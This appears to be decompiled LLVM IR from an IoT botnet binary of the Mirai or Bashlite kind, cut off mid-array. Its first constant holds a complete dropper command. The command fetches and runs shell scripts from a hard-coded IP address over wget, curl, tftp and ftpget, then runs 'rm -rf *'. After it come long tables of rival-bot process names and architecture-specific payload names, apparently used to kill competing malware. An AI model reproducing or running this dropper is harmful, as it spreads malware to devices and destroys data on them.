@global_var_1e1b4.541 = constant [704 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \0D\0A\00"
@global_var_1fdd0.543 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_1fde0.544 = constant [6 x i8] c"/tmp/\00"
@global_var_1fde8.545 = constant [6 x i8] c"/var/\00"
@global_var_1fdf0.546 = constant [6 x i8] c"/dev/\00"
@global_var_1fdf8.547 = constant [10 x i8] c"/var/run/\00"
@global_var_1fe04.548 = constant [10 x i8] c"/dev/shm/\00"
@global_var_1fe10.549 = constant [6 x i8] c"/mnt/\00"
@global_var_1fe18.550 = constant [7 x i8] c"/boot/\00"
@global_var_1fe20.551 = constant [6 x i8] c"/usr/\00"
@global_var_1f194.563 = constant [5 x i8] c"wget\00"
@global_var_1f19c.564 = constant [6 x i8] c"armv*\00"
@global_var_1e4d8.565 = constant [5 x i8] c"bot*\00"
@global_var_1f1a4.566 = constant [6 x i8] c"ntpd*\00"
@global_var_1e4ec.567 = constant [7 x i8] c"hackz*\00"
@global_var_1f1ac.568 = constant [8 x i8] c"shitty*\00"
@global_var_1f1b4.569 = constant [6 x i8] c"jack*\00"
@global_var_1e4b0.570 = constant [6 x i8] c"mips*\00"
@global_var_1e490.571 = constant [5 x i8] c"sex*\00"
@global_var_1f1bc.572 = constant [4 x i8] c"i86\00"
@global_var_1f1c0.573 = constant [5 x i8] c"ssh*\00"
@global_var_1e4d0.574 = constant [5 x i8] c"sh4*\00"
@global_var_1e4e0.575 = constant [11 x i8] c"jackmeoff*\00"
@global_var_1e498.576 = constant [6 x i8] c"tftp*\00"
@global_var_1f1c8.577 = constant [4 x i8] c"i56\00"
@global_var_1f1cc.578 = constant [5 x i8] c"mips\00"
@global_var_1f1d4.579 = constant [7 x i8] c"mipsel\00"
@global_var_1f1dc.580 = constant [4 x i8] c"sh4\00"
@global_var_1f1e0.581 = constant [4 x i8] c"x86\00"
@global_var_1f1e4.582 = constant [5 x i8] c"i686\00"
@global_var_1f1ec.583 = constant [4 x i8] c"ppc\00"
@global_var_1f1f0.584 = constant [5 x i8] c"i586\00"
@global_var_1f1f8.585 = constant [7 x i8] c"mips64\00"
@global_var_1f200.586 = constant [6 x i8] c"sh2eb\00"
@global_var_1f208.587 = constant [7 x i8] c"sh2elf\00"
@global_var_1f210.588 = constant [4 x i8] c"arm\00"
@global_var_1f214.589 = constant [6 x i8] c"armv5\00"
@global_var_1f21c.590 = constant [8 x i8] c"armv4tl\00"
@global_var_1f224.591 = constant [6 x i8] c"armv4\00"
@global_var_1f22c.592 = constant [6 x i8] c"armv6\00"
@global_var_1f234.593 = constant [8 x i8] c"powerpc\00"
@global_var_1f23c.594 = constant [13 x i8] c"powerpc440fp\00"
@global_var_1f24c.595 = constant [5 x i8] c"m68k\00"
@global_var_1f254.596 = constant [6 x i8] c"sparc\00"
@global_var_1f25c.597 = constant [7 x i8] c"x86_64\00"
@global_var_1f264.598 = constant [11 x i8] c"jackmymips\00"
@global_var_1f270.599 = constant [13 x i8] c"jackmymips64\00"
@global_var_1f280.600 = constant [13 x i8] c"jackmymipsel\00"
@global_var_1f290.601 = constant [12 x i8] c"jackmysh2eb\00"
@global_var_1f29c.602 = constant [13 x i8] c"jackmysh2elf\00"
@global_var_1f2ac.603 = constant [10 x i8] c"jackmysh4\00"
@global_var_1f2b8.604 = constant [10 x i8] c"jackmyx86\00"
@global_var_1f2c4.605 = constant [12 x i8] c"jackmyarmv5\00"
@global_var_1f2d0.606 = constant [14 x i8] c"jackmyarmv4tl\00"
@global_var_1f2e0.607 = constant [12 x i8] c"jackmyarmv4\00"
@global_var_1f2ec.608 = constant [12 x i8] c"jackmyarmv6\00"
@global_var_1f2f8.609 = constant [11 x i8] c"jackmyi686\00"
@global_var_1f304.610 = constant [14 x i8] c"jackmypowerpc\00"
@global_var_1f314.611 = constant [19 x i8] c"jackmypowerpc440fp\00"
@global_var_1f328.612 = constant [11 x i8] c"jackmyi586\00"
@global_var_1f334.613 = constant [11 x i8] c"jackmym68k\00"
@global_var_1f340.614 = constant [12 x i8] c"jackmysparc\00"
@global_var_1f34c.615 = constant [13 x i8] c"jackmyx86_64\00"
@global_var_1f35c.616 = constant [11 x i8] c"hackmymips\00"
@global_var_1f368.617 = constant [13 x i8] c"hackmymips64\00"
@global_var_1f378.618 = constant [13 x i8] c"hackmymipsel\00"
@global_var_1f388.619 = constant [12 x i8] c"hackmysh2eb\00"
@global_var_1f394.620 = constant [13 x i8] c"hackmysh2elf\00"
@global_var_1f3a4.621 = constant [10 x i8] c"hackmysh4\00"
@global_var_1f3b0.622 = constant [10 x i8] c"hackmyx86\00"
@global_var_1f3bc.623 = constant [12 x i8] c"hackmyarmv5\00"
@global_var_1f3c8.624 = constant [14 x i8] c"hackmyarmv4tl\00"
@global_var_1f3d8.625 = constant [12 x i8] c"hackmyarmv4\00"
@global_var_1f3e4.626 = constant [12 x i8] c"hackmyarmv6\00"
@global_var_1f3f0.627 = constant [11 x i8] c"hackmyi686\00"
@global_var_1f3fc.628 = constant [14 x i8] c"hackmypowerpc\00"
@global_var_1f40c.629 = constant [19 x i8] c"hackmypowerpc440fp\00"
@global_var_1f420.630 = constant [11 x i8] c"hackmyi586\00"
@global_var_1f42c.631 = constant [11 x i8] c"hackmym68k\00"
@global_var_1f438.632 = constant [12 x i8] c"hackmysparc\00"
@global_var_1f444.633 = constant [13 x i8] c"hackmyx86_64\00"
@global_var_1f454.634 = constant [3 x i8] c"b1\00"
@global_var_1f458.635 = constant [3 x i8] c"b2\00"
@global_var_1f45c.636 = constant [3 x i8] c"b3\00"
@global_var_1f460.637 = constant [3 x i8] c"b4\00"
@global_var_1f464.638 = constant [3 x i8] c"b5\00"
@global_var_1f468.639 = constant [3 x i8] c"b6\00"
@global_var_1f46c.640 = constant [3 x i8] c"b7\00"
@global_var_1f470.641 = constant [3 x i8] c"b8\00"
@global_var_1f474.642 = constant [3 x i8] c"b9\00"
@global_var_1f478.643 = constant [4 x i8] c"b10\00"
@global_var_1f47c.644 = constant [4 x i8] c"b11\00"
@global_var_1f480.645 = constant [4 x i8] c"b12\00"
@global_var_1f484.646 = constant [4 x i8] c"b13\00"
@global_var_1f488.647 = constant [4 x i8] c"b14\00"
@global_var_1f48c.648 = constant [4 x i8] c"b15\00"
@global_var_1f490.649 = constant [4 x i8] c"b16\00"
@global_var_1f494.650 = constant [4 x i8] c"b17\00"
@global_var_1f498.651 = constant [4 x i8] c"b18\00"
@global_var_1f49c.652 = constant [4 x i8] c"b19\00"
@global_var_1f4a0.653 = constant [4 x i8] c"b20\00"
@global_var_1f4a4.654 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_1f4b8.655 = constant [9 x i8] c"DFhxdhdf\00"
@global_var_1f4c4.656 = constant [10 x i8] c"dvrHelper\00"
@global_var_1f4d0.657 = constant [8 x i8] c"FDFDHFC\00"
@global_var_1f4d8.658 = constant [5 x i8] c"FEUB\00"
@global_var_1f4e0.659 = constant [9 x i8] c"FTUdftui\00"
@global_var_1f4ec.660 = constant [9 x i8] c"GHfjfgvj\00"
@global_var_1f4f8.661 = constant [6 x i8] c"jhUOH\00"
@global_var_1f500.662 = constant [9 x i8] c"JIPJIPJj\00"
@global_var_1f50c.663 = constant [10 x i8] c"JIPJuipjh\00"
@global_var_1f518.664 = constant [8 x i8] c"kmymips\00"
@global_var_1f520.665 = constant [10 x i8] c"kmymips64\00"
@global_var_1f52c.666 = constant [10 x i8] c"kmymipsel\00"
@global_var_1f538.667 = constant [9 x i8] c"kmysh2eb\00"
@global_var_1f544.668 = constant [10 x i8] c"kmysh2elf\00"
@global_var_1f550.669 = constant [7 x i8] c"kmysh4\00"
@global_var_1f558.670 = constant [7 x i8] c"kmyx86\00"
@global_var_1f560.671 = constant [9 x i8] c"kmyarmv5\00"
@global_var_1f56c.672 = constant [11 x i8] c"kmyarmv4tl\00"
@global_var_1f578.673 = constant [9 x i8] c"kmyarmv4\00"
@global_var_1f584.674 = constant [9 x i8] c"kmyarmv6\00"
@global_var_1f590.675 = constant [8 x i8] c"kmyi686\00"
@global_var_1f598.676 = constant [11 x i8] c"kmypowerpc\00"
@global_var_1f5a4.677 = constant [16 x i8] c"kmypowerpc440fp\00"
@global_var_1f5b4.678 = constant [8 x i8] c"kmyi586\00"
@global_var_1f5bc.679 = constant [8 x i8] c"kmym68k\00"
@global_var_1f5c4.680 = constant [9 x i8] c"kmysparc\00"
@global_var_1f5d0.681 = constant [10 x i8] c"kmyx86_64\00"
@global_var_1f5dc.682 = constant [8 x i8] c"lolmips\00"
@global_var_1f5e4.683 = constant [10 x i8] c"lolmips64\00"
@global_var_1f5f0.684 = constant [10 x i8] c"lolmipsel\00"
@global_var_1f5fc.685 = constant [9 x i8] c"lolsh2eb\00"
@global_var_1f608.686 = constant [10 x i8] c"lolsh2elf\00"
@global_var_1f614.687 = constant [7 x i8] c"lolsh4\00"
@global_var_1f61c.688 = constant [7 x i8] c"lolx86\00"
@global_var_1f624.689 = constant [9 x i8] c"lolarmv5\00"
@global_var_1f630.690 = constant [11 x i8] c"lolarmv4tl\00"
@global_var_1f63c.691 = constant [9 x i8] c"lolarmv4\00"
@global_var_1f648.692 = constant [9 x i8] c"lolarmv6\00"
@global_var_1f654.693 = constant [8 x i8] c"loli686\00"
@global_var_1f65c.694 = constant [11 x i8] c"lolpowerpc\00"
@global_var_1f668.695 = constant [16 x i8] c"lolpowerpc440fp\00"
@global_var_1f678.696 = constant [8 x i8] c"loli586\00"
@global_var_1f680.697 = constant [8 x i8] c"lolm68k\00"
@global_var_1f688.698 = constant [9 x i8] c"lolsparc\00"
@global_var_1f694.699 = constant [8 x i8] c"RYrydry\00"
@global_var_1f69c.700 = constant [8 x i8] c"telmips\00"
@global_var_1f6a4.701 = constant [10 x i8] c"telmips64\00"
@global_var_1f6b0.702 = constant [10 x i8] c"telmipsel\00"
@global_var_1f6bc.703 = constant [9 x i8] c"telsh2eb\00"
@global_var_1f6c8.704 = constant [10 x i8] c"telsh2elf\00"
@global_var_1f6d4.705 = constant [7 x i8] c"telsh4\00"
@global_var_1f6dc.706 = constant [7 x i8] c"telx86\00"
@global_var_1f6e4.707 = constant [9 x i8] c"telarmv5\00"
@global_var_1f6f0.708 = constant [11 x i8] c"telarmv4tl\00"
@global_var_1f6fc.709 = constant [9 x i8] c"telarmv4\00"
@global_var_1f708.710 = constant [9 x i8] c"telarmv6\00"
@global_var_1f714.711 = constant [8 x i8] c"teli686\00"
@global_var_1f71c.712 = constant [11 x i8] c"telpowerpc\00"
@global_var_1f728.713 = constant [16 x i8] c"telpowerpc440fp\00"
@global_var_1f738.714 = constant [8 x i8] c"teli586\00"
@global_var_1f740.715 = constant [8 x i8] c"telm68k\00"
@global_var_1f748.716 = constant [9 x i8] c"telsparc\00"
@global_var_1f754.717 = constant [10 x i8] c"telx86_64\00"
@global_var_1f760.718 = constant [12 x i8] c"TwoFacemips\00"
@global_var_1f76c.719 = constant [14 x i8] c"TwoFacemips64\00"
@global_var_1f77c.720 = constant [14 x i8] c"TwoFacemipsel\00"
@global_var_1f78c.721 = constant [13 x i8] c"TwoFacesh2eb\00"
@global_var_1f79c.722 = constant [14 x i8] c"TwoFacesh2elf\00"
@global_var_1f7ac.723 = constant [11 x i8] c"TwoFacesh4\00"
@global_var_1f7b8.724 = constant [11 x i8] c"TwoFacex86\00"
@global_var_1f7c4.725 = constant [13 x i8] c"TwoFacearmv5\00"
@global_var_1f7d4.726 = constant [15 x i8] c"TwoFacearmv4tl\00"
@global_var_1f7e4.727 = constant [13 x i8] c"TwoFacearmv4\00"
@global_var_1f7f4.728 = constant [13 x i8] c"TwoFacearmv6\00"
@global_var_1f804.729 = constant [12 x i8] c"TwoFacei686\00"
@global_var_1f810.730 = constant [15 x i8] c"TwoFacepowerpc\00"
@global_var_1f820.731 = constant [20 x i8] c"TwoFacepowerpc440fp\00"
@global_var_1f834.732 = constant [12 x i8] c"TwoFacei586\00"
@global_var_1f840.733 = constant [12 x i8] c"TwoFacem68k\00"
@global_var_1f84c.734 = constant [13 x i8] c"TwoFacesparc\00"
@global_var_1f85c.735 = constant [14 x i8] c"TwoFacex86_64\00"
@global_var_1f86c.736 = constant [9 x i8] c"UYyuyioy\00"
@global_var_1f878.737 = constant [9 x i8] c"XDzdfxzf\00"
@global_var_1f884.738 = constant [5 x i8] c"xxb1\00"
@global_var_1f88c.739 = constant [5 x i8] c"xxb2\00"
@global_var_1f894.740 = constant [5 x i8] c"xxb3\00"
@global_var_1f89c.741 = constant [5 x i8] c"xxb4\00"
@global_var_1f8a4.742 = constant [5 x i8] c"xxb5\00"
@global_var_1f8ac.743 = constant [5 x i8] c"xxb6\00"
@global_var_1f8b4.744 = constant [5 x i8] c"xxb7\00"
@global_var_1f8bc.745 = constant [5 x i8] c"xxb8\00"
@global_var_1f8c4.746 = constant [5 x i8] c"xxb9\00"
@global_var_1f8cc.747 = constant [6 x i8] c"xxb10\00"
@global_var_1f8d4.748 = constant [6 x i8] c"xxb11\00"
@global_var_1f8dc.749 = constant [6 x i8] c"xxb12\00"
@global_var_1f8e4.750 = constant [6 x i8] c"xxb13\00"
@global_var_1f8ec.751 = constant [6 x i8] c"xxb14\00"
@global_var_1f8f4.752 = constant [6 x i8] c"xxb15\00"
@global_var_1f8fc.753 = constant [6 x i8] c"xxb16\00"
@global_var_1f904.754 = constant [6 x i8] c"xxb17\00"
@global_var_1f90c.755 = constant [6 x i8] c"xxb18\00"
@global_var_1f914.756 = constant [6 x i8] c"xxb19\00"
@global_var_1f91c.757 = constant [6 x i8] c"xxb20\00"
@global_var_1f924.758 = constant i32 49
@global_var_1f928.759 = constant i32 50
@global_var_1f92c.760 = constant i32 51
@global_var_1f930.761 = constant i32 52
@global_var_1f934.762 = constant i32 53
@global_var_1f938.763 = constant i32 54
@global_var_1f93c.764 = constant i32 55
@global_var_1f940.765 = constant i32 56
@global_var_1f944.766 = constant i32 57
@global_var_1f948.767 = constant [3 x i8] c"10\00"
@global_var_1f94c.768 = constant [3 x i8] c"11\00"
@global_var_1f950.769 = constant [3 x i8] c"12\00"
@global_var_1f954.770 = constant [3 x i8] c"13\00"
@global_var_1f958.771 = constant [3 x i8] c"14\00"
@global_var_1f95c.772 = constant [3 x i8] c"15\00"
@global_var_1f960.773 = constant [3 x i8] c"16\00"
@global_var_1f964.774 = constant [3 x i8] c"17\00"
@global_var_1f968.775 = constant [3 x i8] c"18\00"
@global_var_1f96c.776 = constant [3 x i8] c"19\00"
@global_var_1f970.777 = constant [3 x i8] c"20\00"
@global_var_1f974.778 = constant [3 x i8] c"bb\00"
@global_var_1f978.779 = constant [11 x i8] c"busybotnet\00"
@global_var_1f984.780 = constant [5 x i8] c"pppd\00"
@global_var_1f98c.781 = constant [6 x i8] c"pppoe\00"
@global_var_1f994.782 = constant [5 x i8] c"wput\00"
@global_var_1f99c.783 = constant [3 x i8] c"B1\00"
@global_var_1f9a0.784 = constant [3 x i8] c"B2\00"
@global_var_1f9a4.785 = constant [3 x i8] c"B3\00"
@global_var_1f9a8.786 = constant [3 x i8] c"B4\00"
@global_var_1f9ac.787 = constant [3 x i8] c"B5\00"
@global_var_1f9b0.788 = constant [3 x i8] c"B6\00"
@global_var_1f9b4.789 = constant [3 x i8] c"B7\00"
@global_var_1f9b8.790 = constant [3 x i8] c"B8\00"
@global_var_1f9bc.791 = constant [3 x i8] c"B9\00"
@global_var_1f9c0.792 = constant [4 x i8] c"B10\00"
@global_var_1f9c4.793 = constant [4 x i8] c"B11\00"
@global_var_1f9c8.794 = constant [4 x i8] c"B12\00"
@global_var_1f9cc.795 = constant [4 x i8] c"B13\00"
@global_var_1f9d0.796 = constant [4 x i8] c"B14\00"
@global_var_1f9d4.797 = constant [4 x i8] c"B15\00"
@global_var_1f9d8.798 = constant [4 x i8] c"B16\00"
@global_var_1f9dc.799 = constant [4 x i8] c"B17\00"
@global_var_1f9e0.800 = constant [4 x i8] c"B18\00"
@global_var_1f9e4.801 = constant [4 x i8] c"B20\00"
@global_var_1f9e8.802 = constant [10 x i8] c"dvrhelper\00"
@global_var_1f9f4.803 = constant [247 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f194.563, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f19c.564, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e4d8.565, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f1a4.566, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e4ec.567, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f1ac.568, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f1b4.569, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e4b0.570, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e490.571, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f1bc.572, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f1c0.573, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e4d0.574, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1e4e0.575, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e498.576, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f1c8.577, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f1cc.578, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f1d4.579, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f1dc.580, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f1e0.581, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f1e4.582, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f1ec.583, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f1f0.584, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f1cc.578, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f1f8.585, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f1d4.579, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f200.586, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f208.587, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f1dc.580, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f1e0.581, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f210.588, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f214.589, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f21c.590, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f224.591, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f22c.592, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f1e4.582, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f234.593, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1f23c.594, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f1f0.584, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f24c.595, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f254.596, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f25c.597, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1f264.598, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1f270.599, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1f280.600, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1f290.601, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1f29c.602, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1f2ac.603, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1f2b8.604, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1f2c4.605, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1f2d0.606, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1f2e0.607, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1f2ec.608, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1f2f8.609, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1f304.610, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_1f314.611, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1f328.612, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1f334.613, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1f340.614, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1f34c.615, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1f35c.616, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1f368.617, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1f378.618, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1f388.619, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1f394.620, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1f3a4.621, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1f3b0.622, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1f3bc.623, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1f3c8.624, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1f3d8.625, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1f3e4.626, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1f3f0.627, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1f3fc.628, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_1f40c.629, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1f420.630, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1f42c.631, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1f438.632, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1f444.633, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1f454.634, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1f458.635, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1f45c.636, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1f460.637, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1f464.638, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1f468.639, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1f46c.640, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1f470.641, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1f474.642, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f478.643, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f47c.644, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f480.645, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f484.646, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f488.647, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f48c.648, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f490.649, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f494.650, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f498.651, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f49c.652, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f4a0.653, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_1f4a4.654, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1f4b8.655, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1f4c4.656, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f4d0.657, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f4d8.658, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1f4e0.659, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1f4ec.660, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f4f8.661, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1f500.662, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1f50c.663, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f518.664, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1f520.665, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1f52c.666, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1f538.667, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1f544.668, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f550.669, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f558.670, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1f560.671, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1f56c.672, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1f578.673, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1f584.674, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f590.675, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1f598.676, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1f5a4.677, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f5b4.678, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f5bc.679, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1f5c4.680, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1f5d0.681, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f5dc.682, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1f5e4.683, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1f5f0.684, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1f5fc.685, i32 0, i32 0), i8* getelementptr inbounds ([10 x 